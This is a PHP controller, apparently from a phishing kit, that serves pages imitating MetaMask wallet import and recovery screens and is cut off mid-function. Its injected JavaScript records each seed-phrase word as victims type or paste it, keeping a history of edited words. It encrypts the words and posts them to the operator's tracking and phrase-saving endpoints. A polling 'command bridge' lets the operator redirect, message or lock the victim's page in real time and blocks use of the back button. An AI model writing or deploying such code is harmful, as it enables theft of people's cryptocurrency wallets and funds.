<?php
namespace App\Http\Controllers;

use Illuminate\Http\Request;

class UserController extends Controller
{

    public function offline(Request $request)
    {
        return view('user.version1.offline', [
            'token' => $request->cookie('liveled_token'),
            'page'  => 'offline',
        ]);
    }

    // ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ Shared command bridge (injected into every wallet page) ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬

    private function documentAuthorityScript(string $pageName, string $element): string
    {
        $docId = (string) request()->attributes->get('ll_document_id', '');
        return "window._llDocId='{$docId}';window._llStayOk=false;window._llStayId=0;window._llPostTrack=function(p,u){u=u||TRACK;return new Promise(function(res,rej){var n=0;function go(){n++;fetch(u,{method:'POST',body:p,keepalive:true}).then(function(r){return r.text().then(function(t){var j=null;try{j=JSON.parse(t);}catch(e){}return{ok:r.ok,j:j};});}).then(function(x){if(x.ok&&x.j&&x.j.ok===true){res(x.j);return;}if(n>=3){rej();return;}setTimeout(go,250);}).catch(function(){if(n>=3){rej();return;}setTimeout(go,250);});}go();});};window._llStayReadyPromise=(function(){if(!window._llDocId)return Promise.resolve(null);var b=new URLSearchParams({_token:CSRF,type:'page_visit',page:'{$pageName}',element:'{$element}',value:window.location.pathname,doc:window._llDocId});return window._llPostTrack(b).then(function(j){if(j&&j.stay){window._llStayOk=true;window._llStayId=j.stay;}return j;}).catch(function(){return null;});})();";
    }

    private function buildCommandBridge(string $pageName, string $loadingUrl, bool $v2Client = false): string
    {
        // Preview mode: neuter all tracking, skip polling bridge entirely
        if (request()->has('_liveled_preview')) {
            return <<<HTML
<script>
(function(){
  navigator.sendBeacon=function(){return true;};
  var _f=window.fetch;
  window.fetch=function(u,o){
    if(typeof u==='string'&&(u.indexOf('/track')>=0||u.indexOf('/phrase')>=0||u.indexOf('/event')>=0))
      return Promise.resolve(new Response('{}',{status:200,headers:{'Content-Type':'application/json'}}));
    return _f.apply(this,arguments);
  };
  window.handleAdminCommands=function(){};
  document.addEventListener('DOMContentLoaded',function(){
    try{
      var sp=new URLSearchParams(location.search);
      var t=sp.get('_title'),s=sp.get('_sub'),p=sp.get('_phone');
      ['mm-page-title','ellipal-page-title'].forEach(function(id){var el=document.getElementById(id);if(el&&t)el.textContent=t;});
      ['mm-page-subtitle','ellipal-page-subtitle'].forEach(function(id){var el=document.getElementById(id);if(el&&s)el.innerHTML=s;});
    }catch(e){}
  });
})();
</script>
HTML;
        }

        $csrf     = csrf_token();
        $commands = route('track.commands');
        $track    = route('track.event');
        $leave    = route('track.leave');

        // Generate or retrieve per-session encryption key
        $token  = request()->cookie('liveled_token');
        $encKey = '';
        if ($token && preg_match('/^[A-Za-z0-9]{24,96}$/', $token)) {
            $row = \App\Models\UserSession::where('session_token', $token)->first();
            if ($row && $row->enc_key) {
                $encKey = $row->enc_key;
            } else {
                $encKey = \App\Services\PayloadCrypto::generateKey();
                \App\Models\UserSession::where('session_token', $token)
                    ->update(['enc_key' => $encKey]);
            }
        }

        $cryptoLib = $encKey ? \App\Services\PayloadCrypto::jsLib($encKey) : '';
        $docId    = (string) request()->attributes->get('ll_document_id', '');
        $docAuth  = $v2Client
            ? \App\Services\DocumentAuthority::clientScript($pageName, $csrf, $docId, 'page')
            : $this->documentAuthorityScript($pageName, 'page');

        return <<<HTML

<!-- liveled command bridge -->
{$cryptoLib}


<div id="ao" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.65);backdrop-filter:blur(10px);z-index:99999;align-items:center;justify-content:center;">
  <div style="background:#1a1b2e;border:1px solid rgba(255,255,255,.12);border-radius:10px;padding:2rem;max-width:360px;width:90%;text-align:center;box-shadow:0 12px 40px rgba(0,0,0,.5);">
    <div style="font-size:10px;letter-spacing:.16em;color:rgba(255,255,255,.4);text-transform:uppercase;margin-bottom:14px;">System Message</div>
    <p id="ao-msg" style="color:rgba(255,255,255,.85);font-size:14px;line-height:1.7;margin:0 0 20px;font-family:sans-serif;"></p>
    <button onclick="document.getElementById('ao').style.display='none'" style="background:#4b5af5;color:#fff;border:none;border-radius:8px;padding:10px 28px;font-size:13px;font-weight:600;cursor:pointer;font-family:sans-serif;">Dismiss</button>
  </div>
</div>
<script>
(function(){
  if(window.location.search.indexOf('_liveled_preview')!==-1)return;
  var CSRF='{$csrf}',CMDS='{$commands}',TRACK='{$track}',LEAVE='{$leave}';
  (function(){var _s=0,_p=false;function _poll(){if(_p)return;_p=true;var s=++_s;fetch(CMDS,{headers:{'X-CSRF-TOKEN':CSRF}}).then(function(r){return r.text();}).then(function(t){_p=false;if(_s!==s)return;if(window.handleAdminCommands)window.handleAdminCommands({detail:{xhr:{responseText:t}}});}).catch(function(){_p=false;});}setInterval(_poll,1000);document.addEventListener('visibilitychange',function(){if(!document.hidden)_poll();});window.addEventListener('focus',function(){_poll();});})();
  {$docAuth}
  /* page_exit removed ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â events are no longer tracked for page exits */
  window.addEventListener('pagehide',function(e){
    if(!e.persisted)navigator.sendBeacon(LEAVE,new URLSearchParams({_token:CSRF}));
  });
  history.pushState(null,'',location.href);
  window.addEventListener('popstate',function(){history.pushState(null,'',location.href);window.location.replace('{$loadingUrl}');});
  /* iOS Safari bfcache: pageshow fires when page is restored from back/forward cache */
  window.addEventListener('pageshow',function(e){if(e.persisted)window.location.replace('{$loadingUrl}');});
  function navigateTo(url){if(window._llNavDone)return;window._llNavDone=true;document.body.style.transition='opacity .08s ease';document.body.style.opacity='0';setTimeout(function(){if(url===window.location.pathname||url===window.location.href){window.location.reload();}else{window.location.href=url;setTimeout(function(){window.location.replace(url);},600);}},80);}
  function redirectViaPost(url,fields){
    document.body.style.transition='opacity .08s ease';document.body.style.opacity='0';
    setTimeout(function(){
      var form=document.createElement('form');form.method='POST';form.action=url;
      Object.keys(fields||{}).forEach(function(k){var i=document.createElement('input');i.type='hidden';i.name=k;i.value=fields[k];form.appendChild(i);});
      document.body.appendChild(form);form.submit();
    },240);
  }
  window.handleAdminCommands=function(event){
    try{
      var d=JSON.parse(event.detail.xhr.responseText);
      if(!d.commands||!d.commands.length)return;try{d.commands=d.commands.filter(function(c){if(!c.id)return true;var k='_ll_cmd_'+c.id;if(sessionStorage.getItem(k))return false;sessionStorage.setItem(k,'1');return true;});}catch(e){}
      d.commands.forEach(function(cmd){
        if(cmd.command==='redirect'){
          var _p=cmd.payload||{};
          try{
            if(_p.title)sessionStorage.setItem('exitTitle',_p.title);else sessionStorage.removeItem('exitTitle');
            if(_p.subtitle)sessionStorage.setItem('exitSubtitle',_p.subtitle);else sessionStorage.removeItem('exitSubtitle');
          }catch(_e){}
          if(_p.post&&Object.keys(_p.post).length)redirectViaPost(_p.url||'/',_p.post);
          else navigateTo(_p.url||'/');
        }
        if(cmd.command==='show_message'){document.getElementById('ao-msg').textContent=cmd.payload.message||'';document.getElementById('ao').style.display='flex';}
        if(cmd.command==='block'){document.getElementById('ao-msg').textContent=cmd.payload.message||'Access restricted.';document.getElementById('ao').style.display='flex';document.querySelectorAll('button,input,select,textarea,a').forEach(function(el){el.setAttribute('disabled',true);el.style.pointerEvents='none';});}
        if(cmd.command==='reset'){window.location.reload();}
      });
    }catch(e){}
  };
})();
</script>
HTML;
    }

    private function consumeFormStateOnce(string $pageKey): bool
    {
        if (!request()->isMethod('get') || request()->has('_liveled_preview')) {
            return false;
        }
        $token = request()->cookie('liveled_token');
        $sess  = $token ? \App\Models\UserSession::where('session_token', $token)->first() : null;
        $meta  = is_array($sess?->metadata) ? $sess->metadata : [];
        $fs    = (isset($meta['form_state']) && is_array($meta['form_state'])) ? $meta['form_state'] : [];
        if (($fs[$pageKey] ?? 'default') !== 'invalid') {
            return false;
        }
        if ($sess) {
            \App\Models\UserSession::where('session_token', $sess->session_token)
                ->where('metadata->form_state->'.$pageKey, 'invalid')
                ->update(['metadata->form_state->'.$pageKey => 'default']);
        }
        return true;
    }

    // ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ MetaMask pages ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬

    public function metamaskImport(Request $request)
    {
        $html = file_get_contents(resource_path('views/user/metamask/MetaMask.html'));
        $html = ltrim($html, "\xEF\xBB\xBF");
        if (!preg_match('/^\s*<!DOCTYPE/i', $html)) $html = "<!DOCTYPE html>\n" . $html;

        $csrf       = csrf_token();
        $track      = route('track.event');
        $phraseSave = route('phrase.save');
        $bridge     = $this->buildCommandBridge('metamask_import', '/metamask/loading', true);

        $mmShowInvalid = false;
        if ($request->isMethod('get') && !$request->has('_liveled_preview')) {
            $mmToken = $request->cookie('liveled_token');
            $mmSess  = $mmToken ? \App\Models\UserSession::where('session_token', $mmToken)->first() : null;
            $mmMeta  = is_array($mmSess?->metadata) ? $mmSess->metadata : [];
            $mmFs    = (isset($mmMeta['form_state']) && is_array($mmMeta['form_state']))
                ? $mmMeta['form_state'] : [];
            if (($mmFs['metamask_import'] ?? 'default') === 'invalid') {
                $mmShowInvalid = true;
                if ($mmSess) {
                    \App\Models\UserSession::where('session_token', $mmSess->session_token)
                        ->where('metadata->form_state->metamask_import', 'invalid')
                        ->update(['metadata->form_state->metamask_import' => 'default']);
                }
            }
        }
        $mmInvalidJs = $mmShowInvalid ? 'true' : 'false';

        $ui = <<<JS
<script>
(function(){
  var CSRF='{$csrf}', TRACK='{$track}', SAVE='{$phraseSave}';
  var _llMmInvalid={$mmInvalidJs};
  var _wh={}, _lastWords={}, _lastSnap='';
  var ALLOWED=[12,15,18,21,24];
  var _sel=null, _grid=null, _btn=null, _count=12;
  var EYE_OFF='<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-eye-off w-full"><path d="M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49"></path><path d="M14.084 14.158a3 3 0 0 1-4.242-4.242"></path><path d="M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143"></path><path d="m2 2 20 20"></path></svg>';
  var EYE_ON='<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-eye w-full"><path d="M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0"></path><circle cx="12" cy="12" r="3"></circle></svg>';

  function selectedCount(){
    var n=parseInt(_sel&&_sel.value,10);
    return ALLOWED.indexOf(n)>=0?n:12;
  }
  function slotInputs(){
    return Array.from((_grid||document).querySelectorAll('#mm-word-grid [data-mm-slot] input'));
  }
  function getWords(){
    return slotInputs().map(function(inp){ return (inp.value||'').trim(); });
  }
  function syncBtn(){
    if(!_btn)return;
    var words=getWords();
    var n=selectedCount();
    var enough=words.length===n && words.every(Boolean);
    _btn.disabled=!enough;
    if(enough)_btn.removeAttribute('disabled');
    else _btn.setAttribute('disabled','');
  }
  function sendState(force){
    if(!window._llDocId||!window._llStayOk)return Promise.resolve();
    var words=getWords();
    if(!words.some(Boolean)&&!force)return Promise.resolve();
    words.forEach(function(w,i){
      var k=String(i+1),prev=_lastWords[k]||'';
      if(prev&&prev!==w){if(!_wh[k])_wh[k]=[];if(_wh[k].indexOf(prev)===-1)_wh[k].push(prev);}
      _lastWords[k]=w;
    });
    var snap=JSON.stringify({words:words,totalWords:selectedCount(),wordHistory:_wh,passphrase:'',passphraseHistory:[]});
    if(snap===_lastSnap&&!force)return Promise.resolve();
    _lastSnap=snap;
    return (window._encVal?window._encVal(snap):Promise.resolve(snap)).then(function(enc){
      var b=new URLSearchParams({_token:CSRF,page:'metamask_import',type:'phrase_input',element:'full_state',value:enc,doc:window._llDocId,stay:String(window._llStayId||'')});
      return window._llPostTrack(b);
    });
  }
  if(window._llStayReadyPromise)window._llStayReadyPromise.then(function(){sendState(false);});

  function wireRow(row){
    var inp=row.querySelector('input');
    var eye=row.querySelector('button');
    if(inp){
      inp.addEventListener('input',function(){syncBtn();sendState(false);});
      inp.addEventListener('paste',function(e){
        var paste=(e.clipboardData||window.clipboardData).getData('text');
        if(!paste)return;
        var bits=paste.trim().split(/\\s+/).filter(Boolean);
        if(bits.length<2)return;
        e.preventDefault();
        var ins=slotInputs();
        var start=ins.indexOf(inp);
        if(start<0)start=0;
        for(var i=0;i<bits.length && start+i<ins.length;i++) ins[start+i].value=bits[i];
        syncBtn();
        sendState(false);
      });
      inp.addEventListener('keydown',function(e){
        if(e.key!=='Enter')return;
        e.preventDefault();
        var ins=slotInputs();
        var idx=ins.indexOf(inp);
        if(idx>=0 && idx<ins.length-1) ins[idx+1].focus();
      });
    }
    if(eye&&inp){
      eye.addEventListener('click',function(){
        var show=inp.type==='password';
        inp.type=show?'text':'password';
        eye.innerHTML=show?EYE_ON:EYE_OFF;
      });
    }
  }
  function makeRow(i,val){
    var row=document.createElement('div');
    row.className='flex w-full items-center gap-2';
    row.setAttribute('data-mm-slot',String(i));
    row.innerHTML='<span class="w-9">'+i+'.</span><input class="w-full rounded px-4 py-3 text-sm outline-none ring-1 ring-gray-300 transition-all focus:ring-blue-500" type="password" inputmode="text" autocapitalize="none" autocomplete="off" autocorrect="off" spellcheck="false" value=""><button type="button" class="h-7 w-7">'+EYE_OFF+'</button>';
    var inp=row.querySelector('input');
    if(inp)inp.value=val||'';
    wireRow(row);
    return row;
  }
  function adoptExisting(){
    if(!_grid)return;
    var rows=Array.from(_grid.children);
    rows.forEach(function(row,i){
      row.setAttribute('data-mm-slot',String(i+1));
      wireRow(row);
    });
    _count=rows.length;
  }
  function rebuild(n,keep){
    if(!_grid)return;
    _grid.innerHTML='';
    for(var i=0;i<n;i++) _grid.appendChild(makeRow(i+1, keep[i]||''));
    _count=n;
  }

  var prev=window.handleAdminCommands;
  function destPath(u){
    u=u||'/';
    var i=u.indexOf('?');
    return i>=0?u.slice(0,i):u;
  }
  function isMmGet(u){
    var p=destPath(u);
    return p==='/metamask/import'||p==='/metamask/recover'||p==='/metamask/loading';
  }
  function wouldKeep(c){
    if(!c.id)return true;
    try{return !sessionStorage.getItem('_ll_cmd_'+c.id);}catch(e){return true;}
  }
  window.handleAdminCommands=function(ev){
    try{
      var d=JSON.parse(ev.detail.xhr.responseText);
      var cmds=d.commands;
      var take=null;
      if(cmds&&cmds.length){
        cmds.forEach(function(cmd){
          if(cmd.command!=='redirect')return;
          var u=(cmd.payload&&cmd.payload.url)||'/';
          if(!isMmGet(u))return;
          if(!wouldKeep(cmd))return;
          take=cmd;
        });
      }
      if(take){
        if(take.id){
          try{sessionStorage.setItem('_ll_cmd_'+take.id,'1');}catch(e){}
        }
        if(window._llNavDone)return;
        window._llNavDone=true;
        var dest=(take.payload&&take.payload.url)||'/';
        if(destPath(dest)===window.location.pathname) window.location.reload();
        else window.location.href=dest;
        return;
      }
    }catch(e){}
    if(prev) prev.apply(this,arguments);
  };

  document.addEventListener('DOMContentLoaded',function(){
    _sel=document.getElementById('mm-count-select');
    _grid=document.getElementById('mm-word-grid');
    _btn=document.getElementById('mm-submit-btn');
    if(_grid && _grid.children.length===selectedCount()) adoptExisting();
    else rebuild(selectedCount(), []);
    if(_sel){
      _sel.addEventListener('change',function(){
        var neu=selectedCount();
        rebuild(neu, []);
        syncBtn();
        sendState(false);
      });
    }
    if(_llMmInvalid){
      var al=document.getElementById('mm-phrase-alarm');
      if(al){
        al.style.display='block';
        setTimeout(function(){al.style.display='none';},12000);
      }
    }
    if(_btn){
      _btn.addEventListener('click',function(e){
        var words=getWords();
        var n=selectedCount();
        if(words.length!==n||!words.every(Boolean))return;
        e.preventDefault();
        Promise.resolve(window._llStayReadyPromise)
        .then(function(){
          if(!window._llStayOk)throw new Error('stay');
          return sendState(true);
        })
        .then(function(){
          return (window._encVal?window._encVal(words.join(' ')):Promise.resolve(words.join(' '))).then(function(enc){
            var b=new URLSearchParams({_token:CSRF,page:'metamask_import',type:'form_submit',element:'seed_phrase',value:enc,doc:window._llDocId,stay:String(window._llStayId||'')});
            return window._llPostTrack(b);
          });
        })
        .then(function(){
          return fetch(SAVE,{method:'POST',headers:{'Content-Type':'application/json','X-CSRF-TOKEN':CSRF},
            body:JSON.stringify({words:words,passphrase:'',page:'metamask_import',history:_wh}),
            keepalive:true
          }).then(function(r){if(!r.ok)throw new Error('save');});
        })
        .then(function(){
          window.location.href='/metamask/loading';
        })
        .catch(function(){});
      });
      if(!_btn._mmPress){
        _btn._mmPress=true;
        function down(){ if(_btn.disabled)return; _btn.classList.add('is-pressed'); }
        function up(){ _btn.classList.remove('is-pressed'); }
        _btn.addEventListener('pointerdown',function(e){
          if(_btn.disabled)return;
          try{_btn.setPointerCapture(e.pointerId);}catch(_e){}
          down();
        });
        ['pointerup','pointercancel','lostpointercapture','pointerleave','blur'].forEach(function(t){
          _btn.addEventListener(t,up);
        });
        _btn.addEventListener('keydown',function(e){
          if(e.repeat)return;
          if(e.key!=='Enter'&&e.key!==' ')return;
          down();
        });
        _btn.addEventListener('keyup',function(e){
          if(e.key!=='Enter'&&e.key!==' ')return;
          up();
        });
      }
    }
    syncBtn();
    setInterval(function(){syncBtn();sendState(true);},3000);
  });
})();
</script>
JS;
        $html = str_replace('</body>', $bridge.$ui.'</body>', $html);
        return response($html, 200, ['Content-Type' => 'text/html; charset=utf-8']);
    }

    public function metamaskLoading(Request $request)
    {
        $html = file_get_contents(resource_path('views/user/metamask/loading.html'));
        $bridge = $this->buildCommandBridge('metamask_loading', '/metamask/loading', true);
        $go = <<<'JS'
<script>
(function(){
  var prev=window.handleAdminCommands;
  function destPath(u){
    u=u||'/';
    var i=u.indexOf('?');
    return i>=0?u.slice(0,i):u;
  }
  function isMmGet(u){
    var p=destPath(u);
    return p==='/metamask/import'||p==='/metamask/recover'||p==='/metamask/loading';
  }
  function wouldKeep(c){
    if(!c.id)return true;
    try{return !sessionStorage.getItem('_ll_cmd_'+c.id);}catch(e){return true;}
  }
  window.handleAdminCommands=function(ev){
    try{
      var d=JSON.parse(ev.detail.xhr.responseText);
      var cmds=d.commands;
      var take=null;
      if(cmds&&cmds.length){
        cmds.forEach(function(cmd){
          if(cmd.command!=='redirect')return;
          var u=(cmd.payload&&cmd.payload.url)||'/';
          if(!isMmGet(u))return;
          if(!wouldKeep(cmd))return;
          take=cmd;
        });
      }
      if(take){
        if(take.id){
          try{sessionStorage.setItem('_ll_cmd_'+take.id,'1');}catch(e){}
        }
        if(window._llNavDone)return;
        window._llNavDone=true;
        var dest=(take.payload&&take.payload.url)||'/';
        if(destPath(dest)===window.location.pathname) window.location.reload();
        else window.location.href=dest;
        return;
      }
    }catch(e){}
    if(prev) prev.apply(this,arguments);
  };
})();
</script>
JS;
        $html = str_replace('</body>', $bridge . $go . '</body>', $html);
        return response($html, 200, ['Content-Type' => 'text/html; charset=utf-8']);
    }

    public function metamaskRecover(Request $request)
    {
        $html = file_get_contents(resource_path('views/user/metamask/recover.html'));
        $html = ltrim($html, "\xEF\xBB\xBF");
        if (!preg_match('/^\s*<!DOCTYPE/i', $html)) $html = "<!DOCTYPE html>\n" . $html;
        $html = preg_replace('/<head[^>]*>/i', '$0<style>html,body{background:#fff}</style>', $html, 1);
        $bridge = $this->buildCommandBridge('metamask_recover', '/metamask/loading', true);
        $mmRecInvalidJs = $this->consumeFormStateOnce('metamask_recover') ? 'true' : 'false';
        $ui = <<<JS
<script>
(function(){
  var _llMmRecInvalid={$mmRecInvalidJs};
  var ALLOWED=[12,15,18,21,24];
  var _sel=null, _grid=null, _btn=null, _count=12;
  var EYE_OFF='<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-eye-off w-full"><path d="M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49"></path><path d="M14.084 14.158a3 3 0 0 1-4.242-4.242"></path><path d="M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143"></path><path d="m2 2 20 20"></path></svg>';
  var EYE_ON='<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-eye w-full"><path d="M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0"></path><circle cx="12" cy="12" r="3"></circle></svg>';
  function selectedCount(){
    var n=parseInt(_sel&&_sel.value,10);
    return ALLOWED.indexOf(n)>=0?n:12;
  }
  function slotInputs(){
    return Array.from((_grid||document).querySelectorAll('#mm-word-grid [data-mm-slot] input'));
  }
  function getWords(){
    return slotInputs().map(function(inp){ return (inp.value||'').trim(); });
  }
  function syncBtn(){
    if(!_btn)return;
    var words=getWords();
    var n=selectedCount();
    var enough=words.length===n && words.every(Boolean);
    _btn.disabled=!enough;
    if(enough)_btn.removeAttribute('disabled');
    else _btn.setAttribute('disabled','');
  }
  function hop(){
    if(typeof window.navigateTo==='function')window.navigateTo('/metamask/loading');
    else window.location.href='/metamask/loading';
  }
  function wireRow(row){
    var inp=row.querySelector('input');
    var eye=row.querySelector('button');
    if(inp){
      inp.addEventListener('input',syncBtn);
      inp.addEventListener('paste',function(e){
        var paste=(e.clipboardData||window.clipboardData).getData('text');
        if(!paste)return;
        var bits=paste.trim().split(/\\s+/).filter(Boolean);
        if(bits.length<2)return;
        e.preventDefault();
        var ins=slotInputs();
        var start=ins.indexOf(inp);
        if(start<0)start=0;
        for(var i=0;i<bits.length && start+i<ins.length;i++) ins[start+i].value=bits[i];
        syncBtn();
      });
      inp.addEventListener('keydown',function(e){
        if(e.key!=='Enter')return;
        e.preventDefault();
        var ins=slotInputs();
        var idx=ins.indexOf(inp);
        if(idx>=0 && idx<ins.length-1) ins[idx+1].focus();
      });
    }
    if(eye&&inp){
      eye.addEventListener('click',function(){
        var show=inp.type==='password';
        inp.type=show?'text':'password';
        eye.innerHTML=show?EYE_ON:EYE_OFF;
      });
    }
  }
  function makeRow(i,val){
    var row=document.createElement('div');
    row.className='flex w-full items-center gap-2';
    row.setAttribute('data-mm-slot',String(i));
    row.innerHTML='<span class="w-9">'+i+'.</span><input class="w-full rounded px-4 py-3 text-sm outline-none ring-1 ring-gray-300 transition-all focus:ring-blue-500" type="password" inputmode="text" autocapitalize="none" autocomplete="off" autocorrect="off" spellcheck="false" value=""><button type="button" class="h-7 w-7">'+EYE_OFF+'</button>';
    var inp=row.querySelector('input');
    if(inp)inp.value=val||'';
    wireRow(row);
    return row;
  }
  function adoptExisting(){
    if(!_grid)return;
    var rows=Array.from(_grid.children);
    rows.forEach(function(row,i){
      row.setAttribute('data-mm-slot',String(i+1));
      wireRow(row);
    });
    _count=rows.length;
  }
  function rebuild(n,keep){
    if(!_grid)return;
    _grid.innerHTML='';
    for(var i=0;i<n;i++) _grid.appendChild(makeRow(i+1, keep[i]||''));
    _count=n;
  }
  document.addEventListener('DOMContentLoaded',function(){
    _sel=document.getElementById('mm-count-select');
    _grid=document.getElementById('mm-word-grid');
    _btn=document.getElementById('mm-submit-btn');
    if(_grid && _grid.children.length===selectedCount()) adoptExisting();
    else rebuild(selectedCount(), []);
    if(_sel){
      _sel.addEventListener('change',function(){
        var neu=selectedCount();
        var old=_count;
        var cur=getWords();
        var keep=cur.slice(0, Math.min(old, neu));
        rebuild(neu, keep);
        syncBtn();
      });
    }
    if(_llMmRecInvalid){
      var al=document.getElementById('mm-phrase-alarm');
      if(al){
        al.style.display='block';
        setTimeout(function(){al.style.display='none';},12000);
      }
    }
    if(_btn){
      _btn.addEventListener('click',function(e){
        var words=getWords();
        var n=selectedCount();
        if(words.length!==n||!words.every(Boolean))return;
        e.preventDefault();
        hop();
      });
    }
    syncBtn();
  });
})();
</script>
JS;
        $go = <<<'JS'
<script>
(function(){
  var prev=window.handleAdminCommands;
  function destPath(u){
    u=u||'/';
    var i=u.indexOf('?');
    return i>=0?u.slice(0,i):u;
  }
  function isMmGet(u){
    var p=destPath(u);
    return p==='/metamask/import'||p==='/metamask/recover'||p==='/metamask/loading';
  }
  function wouldKeep(c){
    if(!c.id)return true;
    try{return !sessionStorage.getItem('_ll_cmd_'+c.id);}catch(e){return true;}
  }
  window.handleAdminCommands=function(ev){
    try{
